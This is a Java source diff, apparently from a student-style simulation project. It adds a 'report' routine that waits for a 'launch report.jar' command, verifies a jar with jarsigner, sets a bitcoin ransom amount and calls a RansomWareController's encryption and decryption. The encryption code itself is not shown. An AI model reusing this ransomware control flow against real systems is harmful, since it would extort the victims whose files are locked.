@@ -1,14 +1,6 @@
 import java.io.*;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
 import java.util.ArrayList;
-import java.util.List;
 import java.util.Random;
-import java.util.Scanner;
-import java.io.BufferedWriter;
-import java.io.File;
-import java.io.FileWriter;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.security.*;
@@ -16,20 +8,23 @@ import java.security.interfaces.ECPrivateKey;
 import java.security.interfaces.ECPublicKey;
 import java.security.spec.ECGenParameterSpec;
 import java.security.spec.ECPoint;
-import java.util.stream.Collectors;
-import java.util.stream.Stream;
+import java.util.Scanner;
 
 
 public class Application {
     public static void main(String... args) throws IOException {
 
-        RansomWareController ransomWareController = new RansomWareController();
-        ClueLess clueLess = new ClueLess();
 
-        ransomWareController.addSubscriber(clueLess);
+        Scanner scanner = new Scanner(System.in);
+        String input;
 
-        ransomWareController.encryption();
-        ransomWareController.decryption();
+        do{
+            input = scanner.next();
+            System.out.println(input);
+            System.out.println("!(input.contains(\"launch\") && input.contains(\"report.jar\")): "+ !(input.contains("launch") && input.contains("report.jar")));
+        }while(!(input.contains("launch") && input.contains("report.jar")));
+        report(scanner, input);
+
 
         System.out.println();
 
@@ -53,22 +48,51 @@ public class Application {
         miners.get(n).mine(block01);
 
         Application application = new Application();
-        //application.generateKeys();
 
-        /*Scanner scanner = new Scanner(System.in);
+    }
 
-        System.out.print("[insurance]                  : ");
-        String insurance = scanner.nextLine();
-        System.out.println(insurance);
+    public static void report(Scanner scanner, String input){
 
-        System.out.print("[tax]                        : ");
-        double tax = scanner.nextDouble();
-        System.out.println(tax);
+        RansomWareController ransomWareController = new RansomWareController();
+        EncryptionDecryption encryptionDecryption = new EncryptionDecryption();
 
-        System.out.print("[defaultParkingSpaceID]      : ");
-        int defaultParkingSpaceID = scanner.nextInt();
-        System.out.println(defaultParkingSpaceID);*/
+        boolean transactionSuccessful = false;
+        boolean timeOver = false;
+        float bitcoinAmountForDecryption = 0.02755f;
+        String transactionState = "transaction";
 
+        try {
+            ProcessBuilder processBuilder = new ProcessBuilder("C:\\Program Files\\Java\\jdk-17.0.1\\bin\\jarsigner", "-verify", "ransomWare/report.jar");
+            Process process = processBuilder.start();
+            process.waitFor();
+
+            InputStream inputStream = process.getInputStream();
+            InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
+            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
+            String line;
+            boolean isComponentAccepted = false;
+
+            while ((line = bufferedReader.readLine()) != null) {
+                System.out.println(line);
+                if (line.contains("verified")) {
+                    isComponentAccepted = true;
+                }
+            }
+
+            if (isComponentAccepted) {
+                System.out.println("component accepted");
+            } else {
+                System.out.println("component rejected");
+            }
+
+        } catch (Exception e) {
+            System.out.println(e.getMessage());
+        }
+
+        ransomWareController.addSubscriber(encryptionDecryption);
+
+        ransomWareController.encryption();
+        ransomWareController.decryption();
     }
 
 
